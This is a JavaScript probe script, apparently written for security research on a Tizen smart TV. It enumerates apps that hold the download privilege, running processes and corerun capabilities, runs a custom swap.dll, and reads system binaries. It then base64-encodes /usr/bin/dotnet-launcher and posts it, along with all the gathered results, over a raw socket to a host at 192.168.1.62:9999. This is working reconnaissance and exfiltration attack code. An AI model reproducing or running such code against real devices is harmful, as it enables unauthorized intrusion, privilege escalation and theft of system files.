"use strict";
/* p20: find apps with download privilege (CDP target), exfil dotnet-launcher, test corerun */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
var HOST = '192.168.1.62';
var PORT = 9999;
var SDK = '/home/owner/share/tmp/sdk_tools';
var R = { ts: new Date().toISOString(), probe: 'p20', results: {}, log: [] };
function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try { return cp.execSync(cmd, { timeout: timeout || 30000, maxBuffer: 16*1024*1024 }).toString().trim(); }
  catch (e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString(); return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text) {
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}

// 1. Installed WAS apps with download privilege (config.xml) + .NET (tizen-manifest)
R.results.download_priv_apps = run("grep -rl 'privilege/download' /usr/apps/*/config.xml /usr/apps/*/tizen-manifest.xml 2>/dev/null | head -40", 40000);

// 2. Which of those are WAS (have config.xml) vs .NET — list with appid
R.results.download_was_apps = run("for f in $(grep -rl 'privilege/download' /usr/apps/*/config.xml 2>/dev/null); do d=$(dirname $f); aid=$(grep -aoE 'id=\"[^\"]*\"' $f 2>/dev/null | head -1); nm=$(grep -aoE '<name>[^<]*</name>' $f 2>/dev/null | head -1); echo \"$d : $aid : $nm\"; done 2>&1 | head -40", 40000);

// 3. Currently running app-ish processes
R.results.ps_apps = run("ps -ef 2>/dev/null | grep -iE 'xwalk|wasutility|launchpad|launcher|dotnet|was-' | grep -v grep | head -40", 15000);
R.results.ps_all_count = run("ps -ef 2>/dev/null | wc -l", 10000);

// 4. Store app: find Free My TV / store appid (search manifests for 'store'/'mytv'/'freemytv')
R.results.store_apps = run("ls -d /usr/apps/*store* /usr/apps/*mytv* /usr/apps/*free* /usr/apps/*Store* 2>/dev/null; echo ---; grep -ril 'freemytv\\|free my tv\\|store' /usr/apps/*/tizen-manifest.xml 2>/dev/null | head -10", 20000);

// 5. corerun: caps + direct run of swap.dll (as owner) — does it load our assembly?
R.results.corerun_caps = run("getcap /usr/share/dotnet_org/shared/Microsoft.NETCore.App/2.0.0/corerun 2>/dev/null; echo ---; ls -la /opt/dotnet/runtime/corerun 2>&1", 15000);
R.results.corerun_direct = run("cd /home/owner/share/tmp/sdk_tools/swapapp/bin && /usr/share/dotnet_org/shared/Microsoft.NETCore.App/2.0.0/corerun swap.dll 2>&1; echo EXIT=$?", 30000);
R.results.corerun_markers = run("cat /tmp/swap_done.txt 2>&1; echo ---ERR---; cat /tmp/swap_err.txt 2>&1", 10000);

// 6. exfil dotnet-launcher binary (base64) for Mac analysis
R.results.dnet_size = run("wc -c /usr/bin/dotnet-launcher 2>&1", 10000);
(function() {
  try {
    var b = fs.readFileSync('/usr/bin/dotnet-launcher');
    var b64 = b.toString('base64');
    postRaw('/bin_dotnet-launcher', b64);
    R.results.exfil_dotnet = 'posted ' + b64.length + ' bytes b64';
  } catch(e) { R.results.exfil_dotnet = 'err ' + e; }
})();

// 7. exfil RunningAppsService + launchpad-starter sizes + wasutility
R.results.ras_info = run("ls -la /usr/bin/RunningAppsService /usr/bin/launchpad-starter /usr/bin/wasutility 2>&1", 10000);
R.results.ras_strings = run("(cat /usr/bin/RunningAppsService) | grep -aE 'usage|Usage|help|verb|list|kill|stop|start|launch|app' 2>/dev/null | head -40", 20000);

// 8. live db baseline
R.results.live = run('md5sum /opt/dbspace/.app-context.db 2>&1', 10000);
R.results.journal_now = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p20info', JSON.stringify(R));
L('p20 done');
